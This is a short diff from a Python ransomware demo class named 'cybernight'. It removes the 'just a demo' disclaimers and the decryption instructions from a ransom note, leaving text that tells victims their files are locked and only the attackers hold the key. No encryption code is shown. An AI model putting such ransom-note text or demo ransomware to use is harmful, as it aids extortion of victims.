@@ -119,15 +119,6 @@ class cybernight:
 Your computer has been compromised by a sophisticated encryption algorithm.
 All your files have been locked, and only we possess the decryption key.
 
-To regain access to your valuable data, follow these instructions:
--Put the Me.txt on the desktop since the ransomware constantly checks on the desktop for the file
--DO NOT WORRY THIS IS JUST A DEMO
-
-WARNING:
-- Attempts to decrypt files using unauthorized software will render them permanently inaccessible.
--DO NOT PANIC THIS IS JUST A DEMO USE THE DECRYPTING.py TO DECRYPT THE FILE
-
-Act swiftly and follow instructions precisely to avoid irreparable harm to your data.
 ''')
         return ransom_note_path
 
